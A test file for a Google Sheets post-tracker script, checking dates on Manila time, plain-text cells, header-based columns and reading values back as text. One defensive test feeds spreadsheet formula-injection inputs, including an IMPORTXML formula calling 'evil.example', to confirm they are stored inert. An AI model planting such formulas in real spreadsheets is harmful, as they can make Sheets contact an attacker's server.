/**
 * The tracker's rows: what logPost writes and replies, and what the posts and
 * assignments actions read back. The app takes a logged post's date, time and
 * Posted By from the reply, never from its own clock (tracker.ts), and it reads
 * every value as text.
 */

import { describe, expect, it } from 'vitest';
import { normalize } from '../core/matcher';
import { CASA, createWorld, TOWER } from './world';

const LINK = 'https://www.facebook.com/groups/apg/posts/1/';

describe('logPost replies with the row it wrote', () => {
  it('including the time, on Manila\'s clock (bug 1)', () => {
    const w = createWorld({ now: '2026-03-09 14:30' });

    expect(w.logPost('jan', CASA)).toEqual({
      ok: true,
      status: 'Posted',
      date: '2026-03-09',
      time: '14:30',
      type: 'Condo / House and Lot',
      postedBy: 'Jan Dela Cruz',
    });
    // An existing tab with the old headers: Date, Title, Type, Time. The time as the interns' sheet writes it.
    expect(w.posts.row(2).slice(0, 4)).toEqual(['2026-03-09', 'Casa Amara', 'Condo / House and Lot', '2:30 PM']);
  });

  it('on Manila\'s calendar just after midnight, while UTC is still on the day before', () => {
    const w = createWorld({ now: '2026-03-10 00:15' });

    expect(w.logPost('jan', CASA)).toMatchObject({ date: '2026-03-10', time: '00:15' });
  });

  it('and the app shows exactly the row it reads back later', async () => {
    const w = createWorld({ now: '2026-03-09 16:45' });
    const app = w.app('jan');

    // A group post awaiting the group admin's approval: Pending, with its link (CONTRACT-v3).
    const saved = await app.tracker.logPost({
      propertyId: CASA.id,
      propertyName: CASA.name,
      fbAccount: 'APG Main',
      postLink: LINK,
      status: 'Pending',
    });

    expect(saved).toMatchObject({ date: '2026-03-09', time: '16:45', status: 'Pending', postedBy: 'Jan Dela Cruz' });
    expect(await app.tracker.posts()).toEqual([saved]);
  });
});

describe('what is written is plain text (D7, bug 2)', () => {
  it('writes the date and the time as text, so Sheets does not turn "14:30" into a time', () => {
    const w = createWorld({ now: '2026-03-09 14:30' });
    w.logPost('jan', CASA);

    // No '#': every cell holds exactly the text written.
    expect(w.posts.row(2)).toEqual([
      '2026-03-09', 'Casa Amara', 'Condo / House and Lot', '2:30 PM', 'Posted', 'APG Main', LINK, 'Jan Dela Cruz', CASA.id, '',
    ]);
    // Only the cells it fills. Notes, which Code.gs does not know, keeps the tracker's own format.
    expect(w.posts.formats(2)).toEqual(['@', '@', '@', '@', '@', '@', '@', '@', '@', '']);
  });

  it('writes what the app sent exactly, even what Sheets would evaluate', () => {
    const w = createWorld();
    w.team.writeText(['=Jan', '', 'Intern', 'key-formula', '', 'TRUE']);
    w.logPost('maria', CASA, {
      type: '=IMPORTXML("https://evil.example", "//a")',
      postLink: 'https://www.facebook.com/groups/apg/posts/+639171234567/',
      postedBy: '=Jan',
    });

    // The type comes from the Directory, not the request; the rest is written exactly.
    expect(w.posts.row(2)).toEqual([
      '2026-03-09', 'Casa Amara', 'Condo / House and Lot', '10:00 AM', 'Posted', 'APG Main',
      'https://www.facebook.com/groups/apg/posts/+639171234567/', '=Jan', CASA.id, '',
    ]);
  });

  it('keeps a folder named "1201" as text', () => {
    const w = createWorld();
    w.logPost('jan', TOWER);

    expect(w.posts.row(2)[1]).toBe('1201');
  });

  it('writes the link and the status addLink sets as text too', () => {
    const w = createWorld();
    w.logPost('jan', CASA, { status: 'Pending' });
    expect(w.call('jan', 'addLink', { property: CASA.name, propertyId: CASA.id, postLink: '=HYPERLINK("x")' })).toMatchObject({
      ok: true,
    });

    expect(w.posts.row(2).slice(4, 7)).toEqual(['Posted', 'APG Main', '=HYPERLINK("x")']);
  });

  it('grows a tracker with no empty row left, rather than failing', () => {
    const w = createWorld();
    const full = w.tracker.addSheet('Full', ['Date', 'Title', 'Time', 'Status', 'Post Link', 'Posted By'], { rows: 2 });
    full.type(['2026-03-01', 'Lot 1', '09:00', 'Posted', LINK, 'Ana Reyes']);
    w.project.configure({ POSTS_TAB: 'Full' });

    expect(w.logPost('jan', CASA)).toMatchObject({ ok: true });
    expect(full.maxRows).toBe(3);
    expect(full.row(3)).toEqual(['2026-03-09', 'Casa Amara', '10:00 AM', 'Posted', LINK, 'Jan Dela Cruz']);
  });
});

describe('columns are found by header in each tab', () => {
  it('though the tracker\'s tab and the directory\'s are both sheet id 0, as every first tab is', () => {
    const w = createWorld({ directoryFirst: true });
    expect([w.posts.gid, w.directoryTab.gid]).toEqual([0, 0]);
    w.posts.type(['2026-03-02', 'Casa Amara', 'Group post', '9:00', 'Posted', 'APG Main', LINK, 'Jan Dela Cruz', CASA.id]);

    // Read in turn, in one minute: a column map cached by sheet id alone was the other tab's.
    expect(w.call('maria', 'posts')['posts']).toMatchObject([{ title: 'Casa Amara', postedBy: 'Jan Dela Cruz' }]);
    expect(w.call('maria', 'properties')['properties']).toHaveLength(3);
    expect(w.call('jan', 'property', { id: CASA.id })['property']).toMatchObject({ name: 'Casa Amara' });
    expect(w.call('maria', 'posts')['posts']).toMatchObject([{ title: 'Casa Amara' }]);
  });

  it('at once when a column is moved in the tracker, so a write never lands in the wrong one', () => {
    const w = createWorld();
    w.logPost('jan', CASA, { status: 'Pending' });

    // Someone swaps Title and Type in the header between two requests.
    w.posts.typeAt(1, 2, 'Type').typeAt(1, 3, 'Title');
    w.call('jan', 'logPost', { property: TOWER.name, propertyId: TOWER.id, fbAccount: 'APG Main', postLink: LINK, status: 'Pending' });

    expect(w.posts.row(3).slice(0, 3)).toEqual(['2026-03-09', 'Office Space', '1201']);
  });
});

describe('reading the tracker (bugs 2 and 6)', () => {
  it('gives a time already written as a time back as HH:mm, not as 1899-12-30', () => {
    const w = createWorld();
    // As the old Code.gs left it: the date and the time both evaluated by Sheets.
    w.posts.type(['2026-03-02', 'Casa Amara', 'Group post', '14:30', 'Posted', 'APG Main', LINK, 'Jan Dela Cruz', CASA.id]);
    expect(w.posts.row(2).slice(0, 4)).toEqual(['#date 2026-03-02', 'Casa Amara', 'Group post', '#time 14:30']);

    expect(w.call('maria', 'posts')['posts']).toEqual([
      {
        date: '2026-03-02',
        type: 'Group post',
        title: 'Casa Amara',
        time: '14:30',
        status: 'Posted',
        fbAccount: 'APG Main',
        postLink: LINK,
        postedBy: 'Jan Dela Cruz',
        propertyId: CASA.id,
      },
    ]);
  });

  it('reads a time a person typed as "2:05 PM" as 14:05', () => {
    const w = createWorld();
    w.posts.type(['3/2/2026', 'Casa Amara', '', '2:05 PM', 'Posted', '', '', 'Jan Dela Cruz', '']);

    expect(w.call('maria', 'posts')['posts']).toMatchObject([{ date: '2026-03-02', time: '14:05' }]);
  });

  it('gives every value back as text, whatever Sheets made of it', () => {
    const w = createWorld();
    w.posts.type(['2026-03-02', '1201', '1', '9:00', 'Posted', 'TRUE', '0917', 'Jan Dela Cruz', '']);
    w.assignments.type(['2026-03-09', 'Jan Dela Cruz', '1201', 'To post', '']);

    const posts = w.call('maria', 'posts')['posts'] as Record<string, unknown>[];
    const queue = w.call('maria', 'assignments')['assignments'] as Record<string, unknown>[];

    expect(posts).toEqual([
      expect.objectContaining({ title: '1201', type: '1', time: '09:00', fbAccount: 'TRUE', postLink: '917' }),
    ]);
    expect(queue).toEqual([
      { date: '2026-03-09', assignedTo: 'Jan Dela Cruz', property: '1201', status: 'To post', propertyId: '' },
    ]);
    for (const row of [...posts, ...queue]) {
      for (const value of Object.values(row)) expect(typeof value).toBe('string');
    }
  });

  it('gives the app\'s matcher a title it can read: a folder named 1201 came back a number, and it threw', () => {
    const w = createWorld();
    w.posts.type(['2026-03-02', '1201', '', '', 'Posted', '', '', 'Jan Dela Cruz', '']);
    const [post] = w.call('maria', 'posts')['posts'] as { title: unknown }[];

    expect(() => normalize(post!.title as string)).not.toThrow();
    expect(normalize(post!.title as string)).toBe(normalize(TOWER.name));
  });

  it('gives a date typed into a plain-text cell back as typed, for the app to read', () => {
    const w = createWorld();
    w.logPost('jan', CASA);
    // A manager corrects the date in the row the script wrote, which is plain text now.
    w.posts.typeAt(2, 1, '3/8/2026');

    expect(w.call('maria', 'posts')['posts']).toMatchObject([{ date: '3/8/2026' }]);
  });

  it('reads the queue\'s dates and statuses as the app expects them', async () => {
    const w = createWorld();
    w.assignments.type(['2026-03-09', 'Jan Dela Cruz', 'Casa Amara', 'Pending', CASA.id]);

    expect(await w.app('jan').tracker.assignments()).toEqual([
      { date: '2026-03-09', assignedTo: 'Jan Dela Cruz', propertyName: 'Casa Amara', propertyId: CASA.id, status: 'Pending' },
    ]);
  });
});
